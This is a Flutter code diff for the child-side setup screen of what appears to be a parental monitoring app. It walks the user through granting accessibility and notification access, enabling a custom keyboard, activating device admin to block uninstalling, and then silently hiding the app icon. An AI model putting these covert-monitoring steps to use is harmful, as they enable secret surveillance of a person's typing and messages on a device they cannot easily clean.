@@ -22,6 +22,13 @@ class _AccessibilitySetupScreenState extends State<AccessibilitySetupScreen>
     super.initState();
     WidgetsBinding.instance.addObserver(this);
     _checkPermissionStatus();
+
+    // Automatically prompt after screen loads
+    Future.delayed(const Duration(milliseconds: 1000), () {
+      if (mounted && !_isChecking) {
+        _showInstructionsBottomSheet(context);
+      }
+    });
   }
 
   @override
@@ -37,12 +44,70 @@ class _AccessibilitySetupScreenState extends State<AccessibilitySetupScreen>
     }
   }
 
+  bool _askedNotification = false;
+  bool _askedKeyboardEnable = false;
+  bool _askedKeyboardSelect = false;
+  bool _askedDeviceAdmin = false;
+  bool _protectionStarted = false;
+
   Future<void> _checkPermissionStatus() async {
-    final isGranted =
-        await AccessibilityService.isAccessibilityPermissionGranted();
-    if (isGranted && mounted) {
-      // Navigate to monitored apps after permission granted
-      context.go(AppRoutes.childMonitoredApps);
+    // ── Step 1: Accessibility Service ──
+    final isAccGranted = await AccessibilityService.isAccessibilityPermissionGranted();
+    
+    if (!isAccGranted) {
+      return; // Keep waiting for accessibility
+    }
+
+    // ── Step 2: Notification Listener ──
+    final isNotifGranted = await AccessibilityService.isNotificationListenerEnabled();
+    
+    if (!isNotifGranted) {
+      if (!_askedNotification && mounted) {
+        _askedNotification = true;
+        Future.delayed(const Duration(milliseconds: 500), () {
+            if (mounted) AccessibilityService.requestNotificationListenerPermission();
+        });
+      }
+      return; // Keep waiting for notification access
+    }
+
+    // ── Step 3: KOVA Keyboard ──
+    final isKeyboardEnabled = await AccessibilityService.isKeyboardEnabled();
+
+    if (!isKeyboardEnabled) {
+      if (!_askedKeyboardEnable && mounted) {
+        _askedKeyboardEnable = true;
+        Future.delayed(const Duration(milliseconds: 500), () {
+          if (mounted) AccessibilityService.requestKeyboardPermission();
+        });
+      } else if (_askedKeyboardEnable && !_askedKeyboardSelect && mounted) {
+        _askedKeyboardSelect = true;
+        Future.delayed(const Duration(milliseconds: 500), () {
+          if (mounted) AccessibilityService.showKeyboardPicker();
+        });
+      }
+      return; // Keep waiting for keyboard
+    }
+
+    // ── Step 4: Device Admin (anti-uninstall) ──
+    if (!_askedDeviceAdmin && mounted) {
+      _askedDeviceAdmin = true;
+      Future.delayed(const Duration(milliseconds: 500), () {
+        if (mounted) AccessibilityService.activateDeviceAdmin();
+      });
+      return; // Wait for user to confirm device admin prompt
+    }
+
+    // ── Step 5: Start protection + hide icon (silent, no UI needed) ──
+    if (!_protectionStarted && mounted) {
+      _protectionStarted = true;
+      await AccessibilityService.startProtectionService();
+      await AccessibilityService.hideAppIcon();
+    }
+
+    // ── All services active — proceed to dashboard ──
+    if (mounted) {
+      context.go(AppRoutes.childDashboard);
     }
   }
 
